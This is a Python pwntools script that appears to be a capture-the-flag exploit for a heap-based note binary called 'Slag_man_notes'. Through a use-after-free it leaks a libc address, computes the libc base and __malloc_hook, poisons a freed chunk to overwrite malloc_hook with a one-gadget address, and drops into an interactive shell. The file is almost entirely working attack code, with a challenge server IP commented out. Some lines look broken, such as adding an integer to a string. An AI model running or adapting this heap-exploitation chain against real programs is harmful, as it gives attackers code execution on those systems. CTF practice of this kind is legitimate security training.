#!/usr/bin/env python
# coding=utf-8

from pwn import *

ip = "49.233.13.133"
port = 53402
# io = remote(ip,port)
io = process('./Slag_man_notes')
elf = ELF('./Slag_man_notes')
# libc = elf.libc
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context(log_level='debug', os='linux', arch='amd64')


def choice(c):
    io.recvuntil(":")
    io.sendline(str(c))


def add(size, content):
    choice(1)
    io.recvuntil(":")
    io.sendline(str(size))
    io.recvuntil(":")
    io.send(content)


def edit(index, content):
    choice(3)
    io.recvuntil(":")
    io.sendline(str(index))
    io.recvuntil(":")
    io.sendline(str(len(content)))
    io.recvuntil(":")
    io.send(content)


def show(index):
    choice(2)
    io.recvuntil(":")
    io.sendline(str(index))


def free(index):
    choice(4)
    io.recvuntil(":")
    io.sendline(str(index))

def fake(content):
	choice(6)
	io.recvuntil("?")
	io.send(content)
'''
add(0x100, 'AAAA')
add(0x100, 'AAAA')
add(0x100, 'AAAA')
free(0)
edit(0, 'AAAAAAAA')
show(0)

leak = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
libc_base = leak - 88 - 0x10 - libc.sym['__malloc_hook']
malloc_hook = leak - 88 - 0x10
success(hex(libc_base))
success(hex(malloc_hook))
edit(0,p64(leak))



add(0x100, 'AAAA')
add(0x20, 'BBBB')
add(0x20, 'CCCC')
add(0x20, 'DDDD')

free(6)
free(5)
free(4)

add(0x100, 'DDDD')
edit(6, 'A' * 0x70)
'''

add(0x100, 'AAAA')#0
add(0x100, 'AAAA')#1
add(0x100, 'AAAA')#2


free(0)
edit(0, 'AAAAAAAA')
show(0)

leak = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
libc_base = leak - 88 - 0x10 - libc.sym['__malloc_hook']
malloc_hook = leak - 88 - 0x10
success(hex(libc_base))
success(hex(malloc_hook))
one = 0xf03a4 + libc_base
edit(0,p64(leak))

fake('AAAA')
free(0)
edit(0,p64(malloc_hook-0x20-3))
fake('A'*0x13 + one)
fake('A'*0x13 + one)
free(0)
free(0)
io.interactive()
